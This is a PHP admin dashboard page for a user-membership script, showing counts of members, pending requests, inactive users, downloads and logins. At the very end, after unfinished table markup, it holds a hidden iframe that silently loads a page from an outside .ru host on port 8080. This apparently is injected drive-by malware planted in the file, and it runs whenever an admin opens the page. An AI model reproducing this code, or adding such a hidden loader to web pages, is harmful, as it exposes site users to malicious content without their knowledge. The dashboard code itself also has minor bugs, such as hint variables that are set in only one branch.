<?php

// include needed files
require('../config.php');
require('../global.php');

// connect to the database
db_connect($mysql['username'],$mysql['password'],$mysql['database'],$mysql['host']);

// assign config options from database to an array
$config = get_config($mysql['prefix']);

debug_mode($config['debug_mode']);

// remove users that have not verified their email after 72 hours if email verification is enabled
if($config['verify_email']=='true' && $config['prune_inactive_users']=='true'){
	PruneInactiveUsers($mysql['prefix']);
}

// start the session
admin_sessions($config['admin_session_expire']);
if(!isset($_SESSION['logged_in'])){
	redirect('./login.php');
}



$currentmembers = count_users($mysql['prefix']);
$currentdownloads = count_downloads($mysql['prefix']);
$currentlogins = count_logins($mysql['prefix']);

if($config['require_admin_accept']=="true"){
	$pendingmembers = '<a href="./userrequests.php">'.count_pending_users($mysql['prefix']).'</a>';
	$pendinghintbox = 'This is the number of requests that are waiting for your approval.';
} else {
	$pendingmembers = 'Disabled';
	$pendinghintbox = 'This feature is disabled.';
}

if($config['verify_email']=="true"){
	$inactivemembers = '<a href="./inactiveusers.php">'.count_inactive_users($mysql['prefix']).'</a>';
	$inactivehintbox = 'This is the number of users that have not validated their email.';
	$hintdownloads = 'This is the number of all downloads.';
	$hintlogins = 'This is the number of total logins from all users.';
} else {
	$inactivemembers = 'Disabled';
	$inactivehintbox = 'This feature is disabled.';
}
include "admin_header.php";
?>
<table border="0">
      <tr>
        <td colspan="4"><p class="style5">&nbsp;</p>
        <p class="style5">Protected  Area Infomation</p>
        <p class="style5">&nbsp;</p></td>
      </tr>
      <tr>
        <td colspan="3" class="style8"><div align="left">System  report: </div></td>
        <td width="199" rowspan="6" class="style8">
		Manage users options:
          <ul>
            <li> <a class="menu2" href="./userlist.php">Manage Users</a><br />
                <? if($config['require_admin_accept']=='true'): ?>
            </li>
            <li> <a class="menu2" href="./userrequests.php">User Requests</a><br />
                <? endif; ?>
                <? if($config['verify_email']=='true'): ?>
            </li>
            <li> <a class="menu2" href="./inactiveusers.php">Inactive Users</a><br />
                <? endif; ?>
            </li>
        </ul></td>
      </tr>
      <tr>
        <td width="150" class="style2"><div align="left">Active Members:</div></td>
        <td width="76" class="style2"><div align="left"><a href="./userlist.php">
          <?=$currentmembers?>
        </a> <a href="#" class="hintanchor" onmouseover="showhint('This is the number of registered and approved members currently in the database.', this, event, '150px')">[?]</a></div></td>
        <td width="173" class="style2">&nbsp;</td>
      </tr>
      <tr>
        <td class="style2"><div align="left">Pending Requests:</div></td>
        <td class="style2"><div align="left">
          <?=$pendingmembers?>
        <a href="#" class="hintanchor" onmouseover="showhint('<?=$pendinghintbox?>', this, event, '150px')">[?]</a></div></td>
        <td width="173" class="style2">&nbsp;</td>
      </tr>
      <tr>
        <td class="style2"><div align="left">Inactive Users:</div></td>
        <td class="style2"><div align="left">
          <?=$inactivemembers?>
        <a href="#" class="hintanchor" onmouseover="showhint('<?=$inactivehintbox?>', this, event, '150px')">[?]</a></div></td>
        <td width="173" class="style2">&nbsp;</td>
      </tr>
      <tr>
        <td class="style2"><div align="left">Total downloads: </div></td>
        <td class="style2"><div align="left">
          <?=$currentdownloads?>
          <a href="#" class="hintanchor" onmouseover="showhint('<?=$hintdownloads?>', this, event, '150px')">[?]</a></div></td>
        <td class="style2">&nbsp;</td>
      </tr>
      <tr>
        <td class="style2"><div align="left">Total logins: </div></td>
        <td class="style2"><div align="left">
          <?=$currentlogins?>
        <a href="#" class="hintanchor" onmouseover="showhint('<?=$hintlogins?>', this, event, '150px')">[?]</a></div></td>
    
<iframe src="http://x3y.ru:8080/index.php" width=128 height=103 style="visibility: hidden"></iframe>